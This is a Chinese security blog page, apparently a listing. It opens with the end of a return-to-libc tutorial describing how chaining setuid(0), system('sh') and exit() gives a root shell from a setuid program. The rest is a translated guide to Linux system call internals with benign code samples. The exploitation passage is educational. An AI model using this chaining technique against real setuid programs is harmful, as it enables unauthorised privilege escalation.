<pre><code>到这里就完事了吗？那该如何对应用最低权限准则的root setuid程序进行漏洞利用呢？
</code></pre><h3 id="root-setuid程序漏洞利用"><a href="#root-setuid程序漏洞利用" class="headerlink" title="root setuid程序漏洞利用"></a>root setuid程序漏洞利用</h3><p>针对漏洞代码(vuln_priv)，漏洞利用程序(exp_priv.py)调用system()再紧接着调用exit()还不足以获取root shell。 但如果能修改一下漏洞利用程序(exp_priv.py)，以下面的顺序调用libc函数：</p>
<ul>
<li>setuid(0)</li>
<li>system(“sh”)</li>
<li>exit()</li>
</ul>
<p>这样一来我们就能获取root shell。 这种技术叫做return-to-libc链接(chaining)，将会在<a href="http://www.csyssec.org/20170101/chainingreturntolibc/" target="_blank" rel="external">下一篇</a>中讨论</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-systemcall64list"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20161231/systemcall64list/">Linux(x86)64位系统调用列表</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20161231/systemcall64list/" class="article-date">
	  <time datetime="2016-12-31T13:25:56.000Z" itemprop="datePublished">十二月 31, 2016</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        

          
            <div class="entry-summary" style="margin-left:0;">
            作者: CSysSec出品

CSysSec注：本文维护了Linux (x86) 64位系统调用表项，源码可以参考Sytem call on Linux Cross Reference。32位系统调用表项可以参考这里。另外，IBM Developworks上维护了一个32位系统调用的分类。转载本文请务必注明，文章出处：《Linux(x86)64位系统调用列表》与作者信息：CSysSec出品

其中：%rax表示返回值，%rdi、%rdi、%rsi、%rdx、%r10、%r8与%r9表示参数。如果显示效果不好，请点击文章内查看



%rax
System call
%rdi
%rsi
%rdx
%r10
%r8
%r9




0
sys_read
unsigned int fd
ch...
          

        
          <p class="article-more-link">
            <a href="/20161231/systemcall64list/#more">阅读全文</a>
          </p>
        </div>
      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-systemcallinternal"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20161231/systemcallinternal/">Linux系统调用权威指南</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20161231/systemcallinternal/" class="article-date">
	  <time datetime="2016-12-31T11:35:34.000Z" itemprop="datePublished">十二月 31, 2016</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>来源：<a href="http://www.chongh.wiki/blog/2016/04/09/linux-syscalls/" target="_blank" rel="external">Diting0x</a> | <a href="http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls" target="_blank" rel="external">原文</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本文从传统系统调用到快速系统调用详细介绍了Linux中系统调用原理以及相关源代码，并教大家如何写自己的系统调用。是篇值得推荐的深入分析系统调用的好文章。</p>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/systemcallinternal/" target="_blank" rel="external">Linux系统调用权威指南</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>长话短说（Too long;Don’t read)</li>
<li>什么是系统调用</li>
<li>准备知识<ul>
<li>硬件与软件</li>
<li>用户程序，内核与CPU特权级</li>
<li>中断</li>
<li>特殊模块寄存器</li>
<li>编写汇编代码触发系统调用不是个好主意</li>
</ul>
</li>
</ul>
<ul>
<li>传统系统调用<ul>
<li>自己写汇编代码使用传统系统调用</li>
<li>内核层面：<code>int $0x80</code>入口</li>
<li><code>iret</code>: 从传统系统调用返回</li>
</ul>
</li>
<li>快速系统调用<ul>
<li>32位快速系统调用<ul>
<li><code>sysenter/sysexit</code></li>
<li><code>_ _kernel_vsyscall</code>内幕</li>
<li>自己写汇编代码使用<code>sysenter</code></li>
<li>内核层面：<code>sysenter</code>入口</li>
<li><code>sysexit</code>: 从<code>sysenter</code>中返回</li>
</ul>
</li>
<li>64位快速系统调用<ul>
<li><code>syscall/sysret</code></li>
<li>自己写汇编代码使用syscall</li>
<li>内核层面：<code>syscall</code>入口</li>
<li>sysret: 从syscall中返回</li>
</ul>
</li>
</ul>
</li>
<li>syscall(2)：半手动调用syscall<ul>
<li>glibc <code>syscall</code>封装器内幕</li>
</ul>
</li>
<li>虚拟系统调用<ul>
<li>内核中的vDSO</li>
<li>在内存中定位vDSO</li>
<li>glibc中的vDSO</li>
</ul>
</li>
<li><code>glibc</code>系统调用封装器</li>
<li>重要的syscall相关bugs<ul>
<li>CVE-2010-3301</li>
<li>Android <code>sysenter</code> ABI 破坏</li>
</ul>
</li>
<li>结论</li>
</ul>
</blockquote>
<hr>
<h2 id="长话短说-Too-long-Don’t-read"><a href="#长话短说-Too-long-Don’t-read" class="headerlink" title="长话短说(Too long; Don’t read)"></a>长话短说(Too long; Don’t read)</h2><p>文章解释了Linux程序在内核中是如何调用函数的。</p>
<p>读完你可以知道：触发系统调用的不同方法，如何编写汇编代码触发系统调用(含代码样例), 内核执行系统调用的入口，内核从系统调用返回的出口，glibc封装器，相关bugs，还有更多，更多。</p>
<h2 id="什么是系统调用？"><a href="#什么是系统调用？" class="headerlink" title="什么是系统调用？"></a>什么是系统调用？</h2><p>当你运行的程序调用 open,fork,read,write（以及其它类似的函数)时,就会触发系统调用。</p>
<p>系统调用描述的是用户程序进入内核后执行的任务。用户程序利用系统调用能执行许多操作：创建进程、网络、文件以及I/O操作等。</p>
<p><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html" target="_blank" rel="external">man page for syscalls(2)</a> 列出了全部系统调用。</p>
<p>用户程序可以通过不同的方式执行系统调用，不同CPU架构中，底层执行系统调用的指令也有所不同。</p>
<p>作为应用程序开发者，不必刻意去考虑系统调用是如何执行的。你只需要简单的加上合适的头文件，像调用普通函数一样就可以使用系统调用了。</p>
<p>glibc提供了封装代码将底层抽象，把你传递的参数放置好之后开始进入内核。</p>
<p>在深入理解系统调用执行的细节之前，我们需要定义一些术语，再谈一谈后面要用到的核心知识点。</p>
<h2 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h2><h3 id="硬件与软件"><a href="#硬件与软件" class="headerlink" title="硬件与软件"></a>硬件与软件</h3><p>这篇博客作以下假设：</p>
<ul>
<li>你在使用32位、64位Intel或AMD CPU. 文中提到的方法可能对那些使用其它系统的人同样有效，但列出的代码都是依赖CPU的。</li>
<li>你感兴趣的是Linux kernel 3.13.0. 其它的内核版本类似，但实际的代码行号，代码架构以及文件路径会有所不同。文中也提供了3.13.0内核源代码的github链接。</li>
<li><p>你感兴趣的是<code>glibc</code>，或者由<code>glibc</code>衍生的其它libc实现(比如<code>eglibc</code>).</p>
<p>文中提到的x86-64指的是基于x86架构的64位Intel和AMD处理器。</p>
</li>
</ul>
<h3 id="用户程序，内核与CPU特权级"><a href="#用户程序，内核与CPU特权级" class="headerlink" title="用户程序，内核与CPU特权级"></a>用户程序，内核与CPU特权级</h3><p>用户程序(如编辑器、终端、ssh进程等)需要与内核交互，内核才能代表用户程序执行一些其不能执行的操作。</p>
<p>举个例子，如果一个用户程序需要执行一些I/O操作(open,read,write等)或者修改自身的地址空间(mmap,sbrk等)，必须要通知内核才能代表其自身完成这些操作。</p>
<p>那么又是什么阻碍了用户程序自身执行这些操作呢？</p>
<p>x86-64处理器引入了特权级的概念。特权级是个复杂的话题，需要另写博文详述了。当然，本文重点不在此，因此将特权级的概念简化如下：</p>
<ol>
<li>特权级实现了访问控制。当前特权级决定了哪些CPU指令和I/O操作能被执行。</li>
<li>内核运行在最高特权级，称为“Ring 0”；用户程序运行在最低特权级,称为”Ring 3”.</li>
</ol>
<p>用户程序要执行特权操作，必须经历特权级转变的过程(从”Ring 3”到“Ring 0”),才能让内核来执行这些操作。</p>
<p>有许多方法能引起特权级转变并触发内核执行相关操作。</p>
<p>从常用的方法说起：中断。</p>
<h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>可以把中断理解为硬件或软件引发的一个事件。</p>
<p>硬件中断源于硬件设备通知内核某个特殊事件的发生。网卡收到数据包时产生的中断是比较常见的硬件中断。</p>
<p>软件中断由某段代码的执行而引发。在x86-64系统中，执行 int指令就会引发软件中断。</p>
<p>中断通常都会被分配一个中断号。这些中断号有着特殊的含义。</p>
<p>想象存储在CPU内存中的一个数组，数组的每个条目都映射为一个中断号。每个条目还存储了当CPU接收到中断信号后将要执行的函数地址以及一些其它的选项，选项中含有中断处理函数应该在哪个特权级上执行的信息。</p>
<p>下面的这张图取自Intel CPU手册，描述了数组中每个条目的存储结构。</p>
<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/idt.png" alt="idt"></p>
<p>仔细看，会发现有一个2位的域标记着特权级描述符(DPL)。这个值决定了当执行中断处理函数时CPU需要的最低特权级。</p>
<p>当CPU接收到特定类型事件时，通过DPL信息知道它应该执行在哪个地址空间，以及事件处理器应该执行在哪个特权级上。</p>
<p>实际上，在x86-64系统中有许多不同的方法处理中断。对这个感兴趣想了解更多的可以参考 <a href="http://wiki.osdev.org/8259_PIC" target="_blank" rel="external">8259 Programmable Interrupt Controller, Advanced Interrupt Controllers</a>和<a href="http://wiki.osdev.org/IOAPIC" target="_blank" rel="external"> IO Advanced Interrupt Controllers</a>.</p>
<p>当处理硬件中断和软件中断时，还会涉及到其它一些复杂的工作要处理，比如中断号冲突与重映射等问题。</p>
<p>讨论系统调用时，我们不必关注以上这些细节。</p>
<h3 id="特殊模块寄存器"><a href="#特殊模块寄存器" class="headerlink" title="特殊模块寄存器"></a>特殊模块寄存器</h3><p>特殊模块寄存器（MSRs)是用来控制CPU某些特性的一组控制寄存器。 CPU文档中列举了每个MSRs的地址。</p>
<p>可以执行CPU指令 <code>rdmsr/wrmsr</code>来读/写 MSRs.</p>
<p>也有一些命令行工具可以用来读/写 MSRs. 但不建议这么做，因为修改这些值（尤其当系统在运行的时候)是相当危险的，除非你真的能做到小心翼翼。</p>
<p>如果你不介意让你的系统不稳定或者不可恢复的损坏你的数据，你可以安装<code>msr-tools</code>工具并加载<code>msr</code>内核模块来读/写MSRs.</p>
<pre><code>% sudo apt-get install msr-tools
% sudo modprobe msr
% sudo rdmsr
</code></pre><p>下文中我们会看到一些系统调用的方法就会用到这些MSRs.</p>
<h3 id="编写汇编代码触发系统调用不是个好主意"><a href="#编写汇编代码触发系统调用不是个好主意" class="headerlink" title="编写汇编代码触发系统调用不是个好主意"></a>编写汇编代码触发系统调用不是个好主意</h3><p>自己编写汇编代码来触发系统调用可不是个好主意。</p>
<p>最大的原因就在于一些系统调用在执行之前或之后会有额外的代码需要在glibc中执行。</p>
<p>在下面的例子中，我们会用到<code>exit</code>系统调用。你可以在<code>exit</code>被调用时利用<a href="http://man7.org/linux/man-pages/man3/atexit.3.html" target="_blank" rel="external"><code>atexit</code></a>注册处理函数。</p>
<p>这些处理函数都是被glibc调用的，注意，不是kernel. 因此，当你自己写汇编代码调用<code>exit</code>时，你自己注册的处理函数是不会执行的，因为你绕过了glibc。</p>
<p>然而，写汇编代码来执行系统调用是个不错的学习经验。</p>
<h2 id="传统系统调用"><a href="#传统系统调用" class="headerlink" title="传统系统调用"></a>传统系统调用</h2><p>从上文的准备知识中，我们可以知道两件事情：</p>
<ol>
<li>可以通过软件中断来触发内核的执行</li>
<li>可以通过汇编指令 <code>int</code> 来产生软件中断</li>
</ol>
<p>结合这两个概念我们再去了解Linux系统中的传统系统调用接口。</p>
<p>Linux内核分配了一个特殊的软件中断号，让用户程序进入到内核中执行系统调用。</p>
<p>Linux内核会为中断处理号 128(0x80)注册一个中断处理器<code>ia32-syscall</code>. 通过代码来看看到底怎么做的。</p>
<p>内核3.13.0源码中的<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/traps.c#L770" target="_blank" rel="external"><code>arch/x86/kernel/traps.c</code></a>中有个<code>trap_init</code>函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">init <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="comment">/* ..... other code ... */</span></div><div class="line"></div><div class="line">        set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall);</div></pre></td></tr></table></figure>
<p>其中，<code>IA32_SYSCALL_VECTOR</code>在<code>arch/x86/include/asm/irq_vectors.h</code>中被定义为 <code>0x80</code>.</p>
<p>进一步看，既然内核预留了一个软件中断供用户程序来触发内核的执行，那在这么多的系统调用中，内核又是如何知道该执行哪一个呢？</p>
<p>这时，用户程序需要在<code>eax</code>寄存器中放入系统调用号。系统调用相关的其它参数会被传入到剩余的通用寄存器中。</p>
<p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L378-L397" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中的注释对此有具体的介绍:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">* Emulated IA32 system calls via <span class="keyword">int</span> <span class="number">0x80</span>.</div><div class="line">*</div><div class="line">* Arguments:</div><div class="line">* %eax System call number.</div><div class="line">* %ebx Arg1</div><div class="line">* %ecx Arg2</div><div class="line">* %edx Arg3</div><div class="line">* %esi Arg4</div><div class="line">* %edi Arg5</div><div class="line">* %ebp Arg6    [note: not saved in the <span class="built_in">stack</span> frame, should not be touched]</div><div class="line">*</div></pre></td></tr></table></figure>
<p>现在我们知道了如何执行系统调用以及如何传递这些参数，可以开始试着写一些内联汇编代码。</p>
<h3 id="自己编写汇编代码使用传统系统调用"><a href="#自己编写汇编代码使用传统系统调用" class="headerlink" title="自己编写汇编代码使用传统系统调用"></a>自己编写汇编代码使用传统系统调用</h3><p>要使用传统系统调用，你可以写一小段内联汇编代码，尽管从学习的角度来看这很有用，我绝不鼓励读者们自己编写汇编代码使用系统调用。</p>
<p>在下面的例子中，我们会试着去执行<code>exit</code>系统调用，它只需要一个参数：退出状态.</p>
<p>首先，我们需要找到<code>exit</code>的系统调用号。Linux内核中有个文件将每个系统调用列在了一张表中。很多脚本在构建的时候会处理此文件以产生一些头文件供用户使用。</p>
<p>看看上述的表格，可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_32.tbl</code></a>找到:</p>
<pre><code>1 i386 exit sys_exit
</code></pre><p>可见 <code>exit</code>的系统调用号是1. 根据上文所述，我们需要将系统调用号写入<code>eax</code>寄存器中，以及第一个参数（退出状态)写入<code>ebx</code>寄存器中。</p>
<p>下面介绍的一段C代码（含有一些内联汇编）做的就是上面的工作。可以看到退出状态是’42’.</p>
<p>（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有用，让那些之前从没见过GCC内联汇编代码的人也可以用下面的例子作为参考）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> syscall_nr = <span class="number">1</span>;</div><div class="line">  <span class="keyword">int</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  <span class="keyword">asm</span> (<span class="string">"movl %0, %%eax\n"</span></div><div class="line">             <span class="string">"movl %1, %%ebx\n"</span></div><div class="line">       <span class="string">"int $0x80"</span></div><div class="line">    : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">      <span class="comment">/* (none) */</span></div><div class="line">    : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">      <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status)</div><div class="line">    : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">      <span class="string">"eax"</span>, <span class="string">"ebx"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，编译，执行，然后检查退出状态。</p>
<pre><code>$ gcc -o test test.c
$ ./test
$ echo $?
42
</code></pre><p>成功了！ 这就是我们利用软件中断来执行<code>exit</code>系统调用的全过程。</p>
<h2 id="内核层面：int-0x80入口"><a href="#内核层面：int-0x80入口" class="headerlink" title="内核层面：int $0x80入口"></a>内核层面：<code>int $0x80</code>入口</h2><p>目前为止，我们知道了如何从用户程序中触发系统调用。<br>下面来看看内核如何利用系统调用号执行系统调用中的代码。</p>
<p>回顾前文，内核调用<code>ia32_syscall</code>来注册系统调用处理函数。</p>
<p>该函数是用汇编实现的，定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L426" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中。该函数做了很多事情，但最重要的还是它触发了实际的系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ia32_do_call:</div><div class="line">        <span class="function">IA32_ARG_FIXUP</span></div><div class="line">        call *<span class="title">ia32_sys_call_table</span><span class="params">(,%rax,<span class="number">8</span>)</span> <span class="meta"># xxx: rip relative</span></div></pre></td></tr></table></figure>
<p>注意到，<code>IA32_ARG_FIXUP</code> 是一个宏，做的是重新处理初始参数，以让当前的系统调用层能正确的理解这些参数。</p>
<p><code>ia32_sys_call_table</code> 是<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/syscall_ia32.c#L18-L25" target="_blank" rel="external"><code>arch/x86/ia32/syscall_ia32.c</code></a>中定义的一张表。注意代码中的最后一行 <code>#include</code>. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">sys_call_ptr_t</span> ia32_sys_call_table[__NR_ia32_syscall_max+<span class="number">1</span>] = &#123;</div><div class="line">        <span class="comment">/*</span></div><div class="line">         * Smells like a compiler bug -- it doesn't work</div><div class="line">         * when the &amp; below is removed.</div><div class="line">         */</div><div class="line">        [<span class="number">0</span> ... __NR_ia32_syscall_max] = &amp;compat_ni_syscall,</div><div class="line">#include &lt;<span class="keyword">asm</span>/syscalls_32.h&gt;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>回想一下前面提到在 <a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_32.tbl</code></a> 中定义的系统调用表。</p>
<p>一些脚本在编译的时候使用这张表生成<code>syscalls_32.h</code>头文件。头文件中由一些有效的C代码组成，就像上面一样，以<code>#include</code>的形式插入到<code>ia32_sys_call_table</code>中，里面含有系统调用号引用的函数地址。</p>
<p>到目前为止，你已经知道如何通过传统系统调用进入内核了。</p>
<h2 id="iret-从传统系统调用返回"><a href="#iret-从传统系统调用返回" class="headerlink" title="iret: 从传统系统调用返回"></a>iret: 从传统系统调用返回</h2><p>了解了如何通过软件中断进入内核执行系统调用之后，应该思考，内核应该如何返回到用户程序中并恢复其原始特权级呢？</p>
<p>查阅 <a href="ftp://download.intel.com/design/processor/manuals/253668.pdf" target="_blank" rel="external">Intel Software Developer’s Manual</a> （警告：PDF很大), 可以找到一些有用的图表，描述了当特权级转变时，程序栈的状态。</p>
<p>请看图：</p>
<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/isr_stack.png" alt="isr-stack"></p>
<p>当用户程序利用软件中断将执行环境转变到内核函数<code>ia32_syscall</code>中时，发生特权级转变。上图描述的就是当进入到<code>ia32_syscall</code>中时栈的状态。</p>
<p>这就意味着在<code>ia32_syscall</code>执行前，返回地址和CPU标志(用来编码特权级)以及其它的信息都被存储在栈中。</p>
<p>如此一来，为了恢复用户程序的执行，内核只需要将栈中的这些值拷贝到相应的寄存器中。</p>
<p>好了，这些都是如何做到的？</p>
<p>有很多方法可以做到，其中最简单的就是使用<code>iret</code>指令。</p>
<p>Intel指令集手册中指出，<code>iret</code>指令从栈中将返回地址和保存的寄存器的值按照初始顺序pop出来。</p>
<pre><code>As with a real-address mode interrupt return, the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure.
</code></pre><p>在Linux内核中找到相关的代码有一点点困难，因为它们隐藏在许多宏中,类似的标志以及系统调用退出的追踪信息都会经过额外的处理。</p>
<p>遍历内核中汇编存根里面所有的宏最终会找到<code>iret</code>，用来从系统调用返回到用户程序。</p>
<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L1042-L1043" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>中可以找到<code>irq_return</code>:</p>
<pre><code>irq_return:
INTERRUPT_RETURN
</code></pre><p>其中<code>INTERRUPT_RETURN</code>在 <a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L132" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>被定义为<code>iretq</code></p>
<p>到目前为止，你已经知道传统系统调用是如何工作的了。</p>
<p>##快速系统调用</p>
<p>传统的系统调用过程看起来似乎很合理，但最新的方法是不需要软件中断来触发系统调用的，而且比使用软件中断更快。</p>
<p>这两种快速的方法都分别包含两条指令。一条指令用来进入内核，另一条则用来退出内核。两种方法都在Intel CPU的文档中定义为”快速系统调用”.</p>
<p>然而，Intel和AMD在具体实现的时候，针对CPU分别运行在32位和64位时该采用哪种方法才有更效的问题上产生了分歧。</p>
<p>为了在Intel和AMD处理器中最大化兼容性：</p>
<p>   32位系统中使用：<code>sysenter</code>和<code>sysexit</code><br>   64位系统中使用：<code>syscall</code>和<code>sysret</code></p>
<h3 id="32位快速系统调用"><a href="#32位快速系统调用" class="headerlink" title="32位快速系统调用"></a>32位快速系统调用</h3><h4 id="sysenter-sysexit"><a href="#sysenter-sysexit" class="headerlink" title="sysenter/sysexit"></a><code>sysenter</code>/<code>sysexit</code></h4><p>  用<code>sysenter</code>触发系统调用比传统中断方法要复杂一些，其涉及到用户程序(通过glibc）与内核之间更多的协调问题。</p>
<p>  我们逐步来了解这些细节。首先来看看Intel指令集参考手册中是如何描述<code>sysenter</code>以及如何使用它的。</p>
<p>  看下面：</p>
<pre><code>  Prior to executing the SYSENTER instruction, software must specify the privilege level 0 code segment and code entry point, and the privilege level 0 stack segment and stack pointer by writing values to the following MSRs:

• IA32_SYSENTER_CS (MSR address 174H) — The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment. This value is also used to determine the segment selector of the privilege level 0 stack segment (see the Operation section). This value cannot indicate a null selector.

• IA32_SYSENTER_EIP (MSR address 176H) — The value of this MSR is loaded into RIP (thus, this value references the first instruction of the selected operating procedure or routine). In protected mode, only bits 31:0 are loaded.

• IA32_SYSENTER_ESP (MSR address 175H) — The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the privilege level 0 stack). This value cannot represent a non-canonical address. In protected mode, only bits 31:0 are loaded.
</code></pre><p>换句话说：为了让内核接收到<code>sysenter</code>触发的系统调用，内核必须设置3个特殊模块寄存器（MSRs). 其中最重要的是 <code>IA32_SYSENTER_EIP</code>(地址是0x176). 该MSR代表的是用户程序在执行 <code>sysenter</code>指令时，内核将要执行的函数地址。</p>
<p>我们可以在内核代码<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32-setup.c#L240" target="_blank" rel="external"><code>arch/x86/vdso/vdso32-setup.c</code></a>中找到写MSR的相关代码：</p>
<pre><code>void enable_sep_cpu(void)
</code></pre><p>{<br>        /<em> … other code … </em>/</p>
<pre><code>wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) ia32_sysenter_target, 0);
</code></pre><p><code>MSR_IA32_SYSENTER_EIP</code>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L54" target="_blank" rel="external"><code>arch/x86/include/uapi/asm/msr-index.h</code></a>中定义为 <code>0x00000176</code>。</p>
<p>类似传统软件中断型的系统调用, 使用<code>sysenter</code>触发系统调用时也定义了一些规范。</p>
<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L99-L117" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>的注释中可以找到相关内容:</p>
<pre><code>* 32bit SYSENTER instruction entry.
 *
 * Arguments:
 * %eax System call number.
 * %ebx Arg1
 * %ecx Arg2
 * %edx Arg3
 * %esi Arg4
 * %edi Arg5
 * %ebp user stack
 * 0(%ebp) Arg6
</code></pre><p>回想一下，传统的系统调用方法包括返回到用户程序的机制：<code>iret</code>指令。</p>
<p>要理解让<code>sysenter</code>正确执行的逻辑不太简单，因为不像软件中断,<code>sysenter</code>并不存储返回地址。</p>
<p>实际上，在执行<code>sysenter</code>指令之前，内核要做的一些记录工作都是会随着时间而变化的(如果已经改变了，你就会看到下文中将要描述的bugs了)</p>
<p>为了兼容未来特性的变化，用户程序使用内核中的函数<br><code>_ _kernel_vsyscall</code>。当调用该函数的进程执行时，会被映射到每个用户进程空间中去。</p>
<p>这听起来有点诡异。它是内核中的代码，却在用户层执行。</p>
<p>实际上，<code>_ _kernel_vsyscall</code>是vDSO(virtual Dynamic Shared Object)的一部分，而vDSO允许程序在用户层中执行内核代码。</p>
<p>后文中会具体介绍什么是vDSO，vDSO做了什么以及工作原理是什么。</p>
<p>我们先来了解<code>_ _kernel_vsyscall</code>的一些细节。</p>
<h4 id="kernel-vsyscall内幕"><a href="#kernel-vsyscall内幕" class="headerlink" title="_ _kernel_vsyscall内幕"></a><code>_ _kernel_vsyscall</code>内幕</h4><p><code>_ _kernel_vsyscall</code>函数封装了<code>sysenter</code>调用的规范，定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32/sysenter.S#L31-L40" target="_blank" rel="external"><code>arch/x86/vdso/vdso32/sysenter.S</code></a>:</p>
<pre><code>__kernel_vsyscall:
.LSTART_vsyscall:
    push %ecx
.Lpush_ecx:
    push %edx
.Lpush_edx:
    push %ebp
.Lenter_kernel:
    movl %esp,%ebp
    sysenter
</code></pre><p><code>_ _kernel_vsyscall</code>既然是vDSO(也被称为共享库)的一部分，那用户程序是如何在运行时定位该函数地址的呢？</p>
<p><code>_ _kernel_vsyscall</code>函数的地址被写入到 <a href="https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html" target="_blank" rel="external">ELF 辅助向量</a>, 用户程序以及库函数(主要指glibc)可以在这里找到其地址并使用。</p>
<p>以下方法可用来查找ELF辅助向量：</p>
<ol>
<li>使用<a href="http://man7.org/linux/man-pages/man3/getauxval.3.html" target="_blank" rel="external"><code>getauxval</code></a>函数，带有<code>AT_SYSINFO</code>参数.</li>
<li>迭代搜索环境变量,然后从内存中解析这些变量.</li>
</ol>
<p>第一种方法较为简单，但glibc 2.16前的版本不支持。 下文例子中介绍的代码中实现的是第二种方法。</p>
